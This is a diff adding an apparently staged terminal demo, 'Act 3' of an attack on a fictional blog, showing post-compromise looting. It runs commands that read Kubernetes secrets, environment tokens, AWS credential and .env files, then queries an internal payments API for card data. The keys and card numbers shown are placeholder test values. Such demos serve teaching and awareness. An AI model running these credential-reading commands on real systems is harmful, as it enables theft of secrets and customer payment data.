@@ -1,0 +1,31 @@
+
+[1m[35m━━━ ACT 3 — Living off the land: loot ━━━[0m
+
+[1m[31mattacker@internet[0m:[34m~[0m$ ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1[0m
+  ls: /var/run/secrets/kubernetes.io/serviceaccount: No such file or directory
+
+[1m[31mattacker@internet[0m:[34m~[0m$ env | grep -ciE 'pass|token|secret|key' || true[0m
+  0
+
+[1m[31mattacker@internet[0m:[34m~[0m$ cat ~/.aws/credentials[0m
+  [default]
+  aws_access_key_id = AKIAIOSFODNN7EXAMPLE
+  aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+  region = eu-west-1
+  # s3://unhackable-blog-backups (nightly DB dumps)
+
+[1m[31mattacker@internet[0m:[34m~[0m$ cat /opt/blog/.env[0m
+  # Unhackable Blog — runtime configuration
+  DATABASE_URL=postgres://blog:S3cr3t-Pg-Pw@payments-db.payments.svc:5432/blog
+  SESSION_SECRET=9f2a1c7e4b6d8a0f3e5c2b1d7a9e4f60
+  STRIPE_API_KEY=sk_demo_NOT_A_REAL_KEY
+
+[1m[31mattacker@internet[0m:[34m~[0m$ curl -sk --max-time 3 https://kubernetes.default.svc/version | head -5[0m
+  {
+    "major": "1",
+    "minor": "35",
+    "emulationMajor": "1",
+    "emulationMinor": "35",
+
+[1m[31mattacker@internet[0m:[34m~[0m$ curl -s --max-time 3 http://payments-api.payments.svc:8080/api/v1/cards[0m
+  {"cards":[{"exp":"08/29","holder":"A. Lovelace","pan":"4111 1111 1111 1111"},{"exp":"11/28","holder":"G. Hopper","pan":"5500 0000 0000 0004"},{"exp":"02/30","holder":"K. Johnson","pan":"3400 0000 0000 009"}],"warning":"internal use only — PCI scope"}
